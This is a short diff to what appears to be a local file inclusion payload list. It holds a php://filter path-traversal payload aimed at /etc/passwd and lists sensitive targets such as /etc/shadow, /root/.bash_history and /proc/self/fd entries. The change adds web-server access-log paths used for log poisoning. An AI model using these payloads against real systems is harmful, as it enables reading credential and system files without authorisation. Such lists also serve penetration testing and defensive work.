@@ -42,7 +42,6 @@ php://filter/convert.base64-encode/resource=../../../../../etc/passwd
 /proc/version
 /etc/profile
 /etc/passwd
-/etc/passwd
 /etc/shadow
 /root/.bash_history
 /var/log/dmessage
@@ -68,6 +67,17 @@ php://filter/convert.base64-encode/resource=../../../../../etc/passwd
 /proc/self/fd/13
 /proc/self/fd/14
 /proc/self/fd/15
+/httpd/logs/access.log
+/apache/logs/access.log
+logs/access.log
+/var/log/access_log
+/var/log/httpd/access_log
+/var/log/httpd-error.log
+/var/log/apache/access.log
+/var/log/apache2/access.log
+/var/log/httpd-access.log
+/var/log/httpd/access_log
+/var/log/httpd/access.log
 ...*
 
 Drupal
